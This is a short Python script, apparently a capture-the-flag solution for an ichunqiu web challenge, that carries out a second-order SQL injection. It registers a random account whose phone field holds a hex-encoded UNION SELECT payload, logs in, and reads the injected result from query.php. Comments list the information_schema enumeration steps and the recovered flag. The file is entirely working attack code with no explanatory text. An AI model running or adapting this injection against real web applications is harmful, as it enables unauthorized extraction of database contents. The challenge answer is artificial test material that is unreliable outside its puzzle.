#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import requests
import binascii
import random
import string

req = requests.Session()

URL = 'http://xxx.game.ichunqiu.com'


def username(n=10):
    return ''.join(random.sample(string.ascii_letters, n))


def srt2hex(s):
    return '0x' + binascii.hexlify(s.encode('utf-8')).decode('utf-8')


def reg(u, p):
    data = {
        "username": u,
        "password": "test",
        "phone": p,
        "register": "Login"
    }
    res = req.post(URL + "/register.php", data)
    if res.status_code == 200 and b"\xe6\xb3\xa8\xe5\x86\x8c\xe6\x88\x90\xe5\x8a\x9f" in res.content:
        # print(res.content)
        return login(u)
    else:
        return False


def login(u):
    data = {
        "username": u,
        "password": "test",
        "login": "Login"
    }
    res = req.post(URL + "/login.php", data)
    if res.status_code == 200 and b"\xe7\x99\xbb\xe9\x99\x86\xe6\x88\x90\xe5\x8a\x9f" in res.content:
        return query()
    else:
        return False


def query():
    res = req.get(URL + "/query.php")
    if res.status_code == 200:
        print(res.content.decode('utf-8'))
    else:
        return False

if __name__ == '__main__':
    pl = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
    # flag,user
    pl = "select group_concat(column_name) from information_schema.columns where table_name='flag'"
    # f14g
    pl = "select group_concat(f14g) from flag"
    # flag{7e3f8fdb-6180-4df2-b277-79714b818419}
    pl = "3' and 1=1 union select (%s) limit 1,1#" % pl
    pl = srt2hex(pl)
    # print(pl)
    user = username()
    reg(user, pl)
